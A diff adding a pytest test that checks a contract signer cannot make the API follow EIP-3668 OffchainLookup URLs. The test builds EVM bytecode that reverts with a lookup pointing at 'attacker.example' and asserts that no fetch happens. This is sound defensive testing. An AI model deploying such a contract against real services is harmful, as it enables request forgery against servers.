@@ -305,3 +305,32 @@ def test_a_wallet_that_writes_while_it_answers_is_refused_as_the_chain_refuses_i
     reads = Account.create().address
     w3.provider.make_request("anvil_setCode", [reads, "0x631626ba7e60e01b60005260206000f3"])
     assert signed_by(w3, domain, "Withdraw", message, bytes(65), reads)
+
+
+def test_a_contract_signer_cannot_make_the_api_fetch_urls(w3, monkeypatch):
+    """A signer contract that reverts with an EIP-3668 OffchainLookup has not signed, as for
+    OpenZeppelin. web3 would follow the lookup and fetch the URLs the contract names, so a
+    donor whose key has code could make the API call any address, 30 seconds each."""
+    import requests
+    import web3.utils.exception_handling as handling
+    from eth_abi import encode
+
+    from veritas.chain import eip712
+    from veritas.chain.signatures import STATIC_CALLER, signed_by
+
+    fetched = []
+    monkeypatch.setattr(handling, "validate_ccip_url_host", lambda url: None)
+    monkeypatch.setattr(requests.Session, "get", lambda self, url, **_: fetched.append(url))
+    lookup = keccak(text="OffchainLookup(address,string[],bytes,bytes4,bytes)")[:4] + encode(
+        ["address", "string[]", "bytes", "bytes4", "bytes"],
+        [STATIC_CALLER, ["https://attacker.example/{sender}/{data}.json"], b"", b"1234", b""],
+    )
+    # Copy the revert data that follows this 14-byte head into memory and revert with it.
+    size = f"{len(lookup):04x}"
+    code = bytes.fromhex(f"61{size}600e60003961{size}6000fd") + lookup
+    signer = Account.create().address
+    w3.provider.make_request("anvil_setCode", [signer, "0x" + code.hex()])
+    domain = eip712.Domain(31337, "0x" + "11" * 20)
+    message = {"projectId": bytes(16), "reasonHash": bytes(32)}
+    assert not signed_by(w3, domain, "Withdraw", message, bytes(65), signer)
+    assert fetched == []
